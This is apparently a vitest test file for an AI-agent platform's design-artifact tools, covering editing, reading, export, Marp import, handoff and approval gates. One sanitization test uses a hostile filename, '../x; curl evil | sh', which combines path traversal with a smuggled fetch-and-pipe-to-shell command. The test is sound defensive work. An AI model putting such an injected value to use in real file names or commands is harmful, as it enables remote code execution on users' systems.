/**
 * design_* ToolDef tests: config gating, the patch round trip (read →
 * vdid-targeted replace → fenced write), and token lookup answers. The
 * HTTP seam is stubbed at global fetch — these verify what the tools SEND,
 * the routes' behavior is covered by design-artifacts tests.
 */
import { afterEach, describe, expect, it, vi } from "vitest";
import type { CredentialProvider, Sandbox, SpawnChildRequest, ToolContext } from "@valet/engine";
import { applyVdids } from "@valet/plugin-design/lib";
import {
  designCommentResolveTool,
  designEditTool,
  designExportTool,
  designHandoffTool,
  designImportMarpTool,
  designReadTool,
  designRenderTokenTool,
} from "./design-tools.js";

const DOC = applyVdids(
  `<!DOCTYPE html><html><head><meta name="valet-design" content="v=1; template=document"></head><body><h1>Old</h1></body></html>`,
).html;
const H1_VDID = /<h1 data-vdid="([0-9a-f_]+)"/.exec(DOC)?.[1] ?? "";

/** Full Sandbox stub: every required method throws until a test overrides
 * the ones its tool actually uses (CLAUDE.md type-safety rule 2 — build
 * the full shape, never double-cast a partial). */
function stubSandbox(overrides: Partial<Sandbox> = {}): Sandbox {
  const unused = (method: string) => () => Promise.reject(new Error(`sandbox.${method} not stubbed`));
  return {
    id: "sb1",
    readFile: unused("readFile"),
    readBinary: unused("readBinary"),
    writeFile: unused("writeFile"),
    writeBinary: unused("writeBinary"),
    readdir: unused("readdir"),
    stat: unused("stat"),
    mkdir: unused("mkdir"),
    rm: unused("rm"),
    exec: unused("exec"),
    ...overrides,
  };
}

function stubCredentials(overrides: Partial<CredentialProvider> = {}): CredentialProvider {
  return {
    get: () => Promise.resolve(null),
    request: () => Promise.reject(new Error("credentials.request not stubbed")),
    ...overrides,
  };
}

function ctxWith(config: Record<string, unknown> | undefined): ToolContext {
  return {
    userId: "u1",
    orgId: "org1",
    sessionId: "s1",
    threadId: "t1",
    credentials: stubCredentials(),
    sandbox: stubSandbox(),
    config,
    requestDecision: () => Promise.reject(new Error("no gates in this test")),
    signal: new AbortController().signal,
    threadRead: () => Promise.resolve([]),
    listThreads: () => Promise.resolve([]),
    setModel: () => Promise.reject(new Error("unused")),
  };
}

const CFG = { apiBaseUrl: "http://api.test", internalToken: "tok" };

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("design tools", () => {
  it("answer [design_unavailable] without toolConfig", async () => {
    const result = await designEditTool.execute(
      { kind: "rewrite", content: DOC, summary: "x" },
      ctxWith(undefined),
    );
    expect(result.text).toContain("[design_unavailable]");
  });

  it("design_edit rewrite POSTs the document with internal auth", async () => {
    const calls: Array<{ url: string; init: RequestInit }> = [];
    vi.stubGlobal("fetch", (url: URL | string, init?: RequestInit) => {
      calls.push({ url: String(url), init: init ?? {} });
      return Promise.resolve(
        new Response(JSON.stringify({ revision: "r-002", sizeBytes: 123 }), { status: 200 }),
      );
    });

    const result = await designEditTool.execute(
      { kind: "rewrite", content: DOC, summary: "restyle" },
      ctxWith(CFG),
    );
    expect(result.text).toBe("wrote revision r-002 (123 bytes)");
    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe("http://api.test/api/sessions/s1/design/edit");
    const headers = calls[0].init.headers as Record<string, string>;
    expect(headers["x-valet-internal"]).toBe("tok");
    expect(headers["x-valet-actor"]).toBe("u1");
  });

  it("design_edit patch reads, replaces by vdid, and writes fenced on the read revision", async () => {
    const calls: Array<{ url: string; body?: unknown }> = [];
    vi.stubGlobal("fetch", (url: URL | string, init?: RequestInit) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        calls.push({ url: u });
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-004", content: DOC }), { status: 200 }),
        );
      }
      calls.push({ url: u, body: JSON.parse(String(init?.body)) });
      return Promise.resolve(
        new Response(JSON.stringify({ revision: "r-005", sizeBytes: 999 }), { status: 200 }),
      );
    });

    const result = await designEditTool.execute(
      { kind: "patch", content: `<h1 data-vdid="${H1_VDID}">New Headline</h1>`, summary: "shorten" },
      ctxWith(CFG),
    );
    expect(result.text).toContain("wrote revision r-005");
    expect(result.text).toContain("replaced 1 element");
    const write = calls[1];
    expect(write.url).toBe("http://api.test/api/sessions/s1/design/edit");
    const body = write.body as { content: string; parentRevision: string };
    expect(body.parentRevision).toBe("r-004");
    expect(body.content).toContain("New Headline");
    expect(body.content).not.toContain(">Old<");
  });

  it("design_edit patch surfaces an unknown vdid without writing", async () => {
    const writes: string[] = [];
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-004", content: DOC }), { status: 200 }),
        );
      }
      writes.push(u);
      return Promise.resolve(new Response("{}", { status: 200 }));
    });

    const result = await designEditTool.execute(
      { kind: "patch", content: '<h1 data-vdid="ffffffffffffffff">X</h1>' },
      ctxWith(CFG),
    );
    expect(result.text).toContain("[design_edit failed]");
    expect(writes).toEqual([]);
  });

  it("design_render_token answers value, not-found, and no-design-system", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(
        new Response(JSON.stringify({ tokens: { "--color-primary": "#0066cc" } }), { status: 200 }),
      ),
    );
    const hit = await designRenderTokenTool.execute({ token_name: "color-primary" }, ctxWith(CFG));
    expect(hit.text).toBe("--color-primary: #0066cc");

    const miss = await designRenderTokenTool.execute({ token_name: "--nope" }, ctxWith(CFG));
    expect(miss.text).toContain("Available tokens: --color-primary");

    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ tokens: {} }), { status: 200 })),
    );
    const none = await designRenderTokenTool.execute({ token_name: "x" }, ctxWith(CFG));
    expect(none.text).toContain("no design system is connected");
  });

  it("design_import_marp gates, reads the workspace file, and writes the converted deck", async () => {
    const writes: Array<{ url: string; body: { content: string; summary: string } }> = [];
    vi.stubGlobal("fetch", (url: URL | string, init?: RequestInit) => {
      writes.push({ url: String(url), body: JSON.parse(String(init?.body)) as (typeof writes)[0]["body"] });
      return Promise.resolve(new Response(JSON.stringify({ revision: "r-002" }), { status: 200 }));
    });

    const gates: string[] = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = (gate) => {
      gates.push(gate.title);
      return Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    };
    ctx.sandbox = stubSandbox({
      readFile: (path: string) => Promise.resolve(`---\nmarp: true\n---\n\n# Deck from ${path}\n`),
    });

    const result = await designImportMarpTool.execute({ file_path: "/workspace/deck.md" }, ctx);
    expect(gates).toEqual(["Import Marp deck?"]);
    expect(result.text).toContain("imported /workspace/deck.md as revision r-002");
    expect(writes[0].body.content).toContain("valet-design");
    expect(writes[0].body.content).toContain("Deck from /workspace/deck.md");
  });

  it("design_import_marp declined gate imports nothing", async () => {
    const writes: string[] = [];
    vi.stubGlobal("fetch", (url: URL | string) => {
      writes.push(String(url));
      return Promise.resolve(new Response("{}", { status: 200 }));
    });
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "deny", resolvedBy: "u1", resolvedAt: 1 });
    const result = await designImportMarpTool.execute({ file_path: "/workspace/deck.md" }, ctx);
    expect(result.text).toContain("declined");
    expect(writes).toEqual([]);
  });

  it("design_handoff spawns a child whose prompt embeds the artifact", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-003", content: DOC }), { status: 200 })),
    );
    const spawned: SpawnChildRequest[] = [];
    const ctx = ctxWith({
      ...CFG,
      childSpawner: (req: SpawnChildRequest) => {
        spawned.push(req);
        return Promise.resolve({ childSessionId: "s_child", queueItemId: "q1" });
      },
    });
    const result = await designHandoffTool.execute({ implementation_task: "Build the landing page" }, ctx);
    expect(result.text).toContain("spawned coding child s_child from revision r-003");
    expect(spawned).toHaveLength(1);
    expect(spawned[0].prompt).toContain("Build the landing page");
    expect(spawned[0].prompt).toContain("valet-design");
  });

  it("design_handoff without a spawner names the limitation", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-003", content: DOC }), { status: 200 })),
    );
    const result = await designHandoffTool.execute({}, ctxWith(CFG));
    expect(result.text).toContain("[design_handoff unavailable]");
  });

  it("design_export html gates on the manifest and writes into /workspace/exports", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const gateBodies: string[] = [];
    const written: Array<{ path: string; content: string }> = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = (gate) => {
      gateBodies.push(gate.body ?? "");
      return Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    };
    ctx.sandbox = stubSandbox({
      mkdir: () => Promise.resolve(),
      writeFile: (path: string, content: string) => {
        written.push({ path, content });
        return Promise.resolve();
      },
    });

    const result = await designExportTool.execute({ format: "html", filename: "launch" }, ctx);
    expect(result.text).toBe("exported revision r-002 to /workspace/exports/launch.html");
    expect(gateBodies[0]).toContain("artifact document");
    expect(gateBodies[0]).toContain("output: /workspace/exports/launch.html");
    expect(written[0].path).toBe("/workspace/exports/launch.html");
    expect(written[0].content).toBe(DOC);
  });

  it("design_export reduces hostile filenames to a safe charset", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const written: string[] = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    ctx.sandbox = stubSandbox({
      mkdir: () => Promise.resolve(),
      writeFile: (path: string) => {
        written.push(path);
        return Promise.resolve();
      },
    });

    // Shell metacharacters, spaces, and path traversal all collapse to '-'
    // and the leading dot-dash prefix is stripped.
    await designExportTool.execute({ format: "html", filename: '../x; curl evil | sh' }, ctx);
    expect(written[0]).toBe("/workspace/exports/x-curl-evil-sh.html");
    expect(written[0]).not.toContain("..");
    expect(written[0]).not.toContain(";");
  });

  it("design_export declined gate writes nothing", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "deny", resolvedBy: "u1", resolvedAt: 1 });
    ctx.sandbox = stubSandbox({
      mkdir: () => Promise.reject(new Error("must not be called")),
      writeFile: () => Promise.reject(new Error("must not be called")),
    });
    const result = await designExportTool.execute({ format: "html" }, ctx);
    expect(result.text).toContain("declined");
  });

  it("design_export gslides creates a presentation and applies fenced chunks", async () => {
    const googleCalls: Array<{ url: string; body?: Record<string, unknown> }> = [];
    vi.stubGlobal("fetch", (url: URL | string, init?: RequestInit) => {
      const u = String(url);
      if (u.includes("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 }),
        );
      }
      const body = init?.body ? (JSON.parse(String(init.body)) as Record<string, unknown>) : undefined;
      googleCalls.push({ url: u, body });
      if (u.endsWith("/presentations")) {
        return Promise.resolve(
          new Response(JSON.stringify({ presentationId: "pres1", revisionId: "grev1" }), { status: 200 }),
        );
      }
      return Promise.resolve(
        new Response(JSON.stringify({ writeControl: { requiredRevisionId: "grev2" } }), { status: 200 }),
      );
    });
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    ctx.credentials = stubCredentials({
      get: (service?: string) =>
        Promise.resolve(service === "google_workspace" ? { accessToken: "gtok" } : null),
    });

    const result = await designExportTool.execute({ format: "gslides", filename: "Deck" }, ctx);
    expect(result.text).toContain("https://docs.google.com/presentation/d/pres1/edit");
    // One create + one batchUpdate chunk (DOC has no <section>, so the body
    // exports as a single slide).
    expect(googleCalls[0].url).toContain("/presentations");
    const update = googleCalls[1];
    expect(update.url).toContain("pres1:batchUpdate");
    expect(update.body?.writeControl).toEqual({ requiredRevisionId: "grev1" });
  });

  it("design_export gslides without a Google credential names the fix", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    const result = await designExportTool.execute({ format: "gslides" }, ctx);
    expect(result.text).toContain("Connect Google Workspace in Settings");
  });

  it("design_read reports revision, unresolved comments, the canvas report, and the elided document", async () => {
    const docWithImage = DOC.replace(
      "<h1",
      '<img src="data:image/png;base64,AAAAAAAA" alt="big"><h1',
    );
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-007", content: docWithImage }), { status: 200 }),
        );
      }
      if (u.endsWith("/design/health")) {
        return Promise.resolve(
          new Response(
            JSON.stringify({
              report: {
                revision: "r-007",
                totalSlides: 6,
                hiddenSlides: [1, 2, 3, 4, 5],
                overflowingSlides: [0],
                scriptsStripped: 1,
              },
            }),
            { status: 200 },
          ),
        );
      }
      return Promise.resolve(
        new Response(
          JSON.stringify({
            comments: [
              { id: "dc_1", vdid: "abc123", body: "Make it pop", resolvedAt: null },
              { id: "dc_2", vdid: "def456", body: "done already", resolvedAt: 5 },
            ],
          }),
          { status: 200 },
        ),
      );
    });
    const result = await designReadTool.execute({}, ctxWith(CFG));
    expect(result.text).toContain("revision r-007");
    expect(result.text).toContain("5 of 6 slides render hidden or blank");
    expect(result.text).toContain("slides 2, 3, 4, 5, 6");
    expect(result.text).toContain("slide 1 overflow the slide box");
    expect(result.text).toContain("CLIPPED");
    expect(result.text).toContain("1 script tag(s) were stripped");
    expect(result.text).toContain("dc_1 on [data-vdid=abc123]: Make it pop");
    expect(result.text).not.toContain("dc_2");
    expect(result.text).toContain('src="[embedded image]"');
    expect(result.text).not.toContain("base64");
  });

  it("design_read marks a canvas report from an older revision as stale", async () => {
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-008", content: DOC }), { status: 200 }),
        );
      }
      if (u.endsWith("/design/health")) {
        return Promise.resolve(
          new Response(
            JSON.stringify({
              report: { revision: "r-007", totalSlides: 6, hiddenSlides: [], scriptsStripped: 0 },
            }),
            { status: 200 },
          ),
        );
      }
      return Promise.resolve(new Response(JSON.stringify({ comments: [] }), { status: 200 }));
    });
    const result = await designReadTool.execute({}, ctxWith(CFG));
    expect(result.text).toContain("STALE: measured at r-007");
    expect(result.text).toContain("all 6 slides render visibly");
  });

  it("design_edit relays server notes (header normalization, staleness)", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(
        new Response(
          JSON.stringify({
            revision: "r-004",
            sizeBytes: 50,
            notes: ["added the missing <meta> header", "the artifact had been changed outside this conversation"],
          }),
          { status: 200 },
        ),
      ),
    );
    const result = await designEditTool.execute({ kind: "rewrite", content: DOC }, ctxWith(CFG));
    expect(result.text).toContain("wrote revision r-004");
    expect(result.text).toContain("note: added the missing");
    expect(result.text).toContain("note: the artifact had been changed outside this conversation");
  });

  it("design_comment_resolve POSTs the resolve route", async () => {
    const urls: string[] = [];
    vi.stubGlobal("fetch", (url: URL | string) => {
      urls.push(String(url));
      return Promise.resolve(new Response(JSON.stringify({ id: "dc_1", resolvedAt: 5 }), { status: 200 }));
    });
    const result = await designCommentResolveTool.execute({ comment_id: "dc_1" }, ctxWith(CFG));
    expect(result.text).toBe("resolved comment dc_1");
    expect(urls[0]).toBe("http://api.test/api/sessions/s1/design/comments/dc_1/resolve");
  });
});
